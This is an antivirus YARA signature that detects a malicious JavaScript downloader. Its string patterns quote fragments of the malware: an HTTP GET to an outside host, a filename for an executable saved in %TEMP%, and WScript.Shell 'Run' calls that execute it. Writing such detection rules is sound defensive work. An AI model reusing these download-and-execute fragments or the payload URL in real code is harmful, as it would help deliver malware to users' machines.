rule sig_20160328_b61e89e7a098dde6b7a04d7014567bae {
  meta:
    description = "datamaliciousorder - file 20160328_b61e89e7a098dde6b7a04d7014567bae.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ee55089c71164eb539bb0ff73829a30cf2c2612da0b021e1f496acacb6570a82"

  strings:
    $s1  = "function Nhwfsfmua() {return Oamrzxgdj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"bSC71zE79RZP.exe\";};" fullword ascii
    $s2  = "Xlorji[Pfugke](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Gudchmh](Nfkouzh() * 11)} while (Xlorji[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Oamrzxgdj = function Xwmqxrjsjn() {return WScript[Lopuz](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Rxyms(Bhriqok, Jmskow){return Bhriqok - Jmskow;};" fullword ascii
    $s6  = "function Qomkfqjjv() {return ((Vapyzmks == true) && (Vapyzmks == Hmmnweesv)) ? 1 : Mymajeeeyx;};" fullword ascii
    $s7  = "var Vapyzmks = false;" fullword ascii
    $s8  = "function Vftxzlcn(){return Lopuz;};" fullword ascii
    $s9  = "var Aaurmvipj = new this[\"Date\"]();" fullword ascii
    $s10 = "var Hmmnweesv = false;" fullword ascii
    $s11 = "return Rxyms(Pifqx, Sfmqgsrflc);" fullword ascii
    $s12 = "Vapyzmks = true; " fullword ascii
    $s13 = "function Nfkouzh(){return 22;};" fullword ascii
    $s14 = " while (Ubsexl){" fullword ascii
    $s15 = "var Rovbihbliy = false;" fullword ascii
    $s16 = "function Asztkpqy(Rhyeenzdsp) {var Jmvrglfx = (1, 2, 3, 4, 5, Rhyeenzdsp); return Jmvrglfx;};" fullword ascii
    $s17 = "Hmmnweesv = true; " fullword ascii
    $s18 = "function Rmbcfupbe(){return Raqtznovw;};" fullword ascii
    $s19 = "function Iymvf()" fullword ascii
    $s20 = "function Oybfee(Vhcajwk){Oamrzxgdj[\"Run\"](Vhcajwk, Mymajeeeyx, Mymajeeeyx);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}